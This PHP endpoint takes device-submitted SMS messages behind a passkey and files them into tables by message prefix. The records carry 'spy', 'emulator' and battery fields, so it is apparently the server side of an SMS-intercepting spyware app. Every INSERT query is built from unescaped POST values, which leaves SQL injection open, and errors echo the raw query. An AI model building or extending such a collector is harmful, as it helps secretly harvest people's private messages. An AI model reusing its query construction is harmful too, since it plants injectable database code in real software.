<?php
try {
    include("config.php");
    $_POST = json_decode(file_get_contents('php://input'), true);
    $passkey = $_POST ["passkey"] ;	
    if(strcmp($passkey,$SERVER_PASS_KEY)!=0) {
        $response_error['error'] = "Wrong passkey";
    } else {
        $owner = $_POST ["owner"] ;	
        $device_id = $_POST ["device_id"] ;
        $message = $_POST ["message"] ; $message = (strlen($message) >= 300) ? substr($message,0,295).'...' : $message;
        $spy = $_POST ["spy"] ;	
        $testing = $_POST ["testing"] ;
        $active = $_POST ["active"] ;
        $battery = $_POST ["battery"] ;
        $emulator = $_POST ["emulator"] ;
        $query = "";
        if(substr( $message, 0, 11 ) === "[EXTRA-SMS]") {
          $query = "INSERT INTO `EXTRA_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
        } else if(substr( $message, 0, 5 ) === "OWNER") {
          $query = "INSERT INTO `OWNER_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
        } else if(substr( $message, 0, 9 ) === "ALTERNATE") {
          $query = "INSERT INTO `ALTERNATE_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
        } else if(substr( $message, 0, 5 ) === "ADMIN") {
          $query = "INSERT INTO `ADMIN_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
        } else if(substr( $message, 0, 5 ) === "SUPER") {
          $query = "INSERT INTO `SUPER_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
        } else {
          $query = "INSERT INTO `OTHER_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
        };
        mysqli_query ($connection, $query) or die ('request "Could not execute SQL query" '.$query);
        echo json_encode($response_success);
        exit();
    }
} catch (ExceptionType $e) {
    $response_error['error'] = $e;
    die($e);
} finally {
    $connection->close();
}
echo json_encode($response_error);
?>